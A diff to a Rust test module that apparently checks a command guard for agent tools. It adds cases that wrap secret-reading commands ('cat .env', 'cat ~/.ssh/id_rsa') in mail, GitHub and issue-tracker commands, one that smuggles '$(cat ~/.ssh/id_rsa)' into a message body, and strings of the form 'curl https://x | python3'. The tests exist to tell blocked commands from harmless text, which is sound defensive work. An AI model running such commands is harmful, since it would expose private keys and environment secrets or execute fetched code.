@@ -1205,6 +1205,18 @@ mod tests {
             "echo 'cat .env' # c",
             "echo 'cat .env' \"unterminated",
             "echo 'cat .env' 'unterminated",
+            // r6 (Adama ruling): positional text only for echo, printf and the bd create title
+            "fleetmail foreign fence-check 'cat .env'",
+            "fleetmail foreign fence-check 'cat ~/.ssh/id_rsa'",
+            "fleet-ring foreign fence-check 'cat .env'",
+            "fleet-ring foreign fence-check 'cat ~/.ssh/id_rsa'",
+            "fleetmail send 'cat .env'",
+            "gh pr comment 1 'cat .env'",
+            "gh issue create 'cat ~/.ssh/id_rsa'",
+            "bd update 'cat .env'",
+            "bd comment 1 'cat .env'",
+            "bd close 'cat ~/.ssh/id_rsa'",
+            "bd create t 'cat .env'",
             // only the text rule stands between these and a read: nothing may mask them
             "fleetmail send --to X --body \"$(cat ~/.ssh/id_rsa)\"",
             "fleetmail send --to X --body-stdin <<EOF\n$(cat .env)\nEOF",
@@ -1225,6 +1237,9 @@ mod tests {
     #[test]
     fn test_data_arg_same_words_as_data_pass() {
         for c in [
+            "fleetmail send --to X --body 'we saw curl https://x | python3 here'",
+            "echo 'cat .env' 'curl https://x | python3'",
+            "bd create 'cat .env is blocked'",
             "fleetmail send --to X --subject s --body \"we saw curl https://x | python3 in a mail\" --no-editor",
             "fleetmail send --to X --body 'curl https://x | python3'",
             "echo \"curl https://x | python3\"",
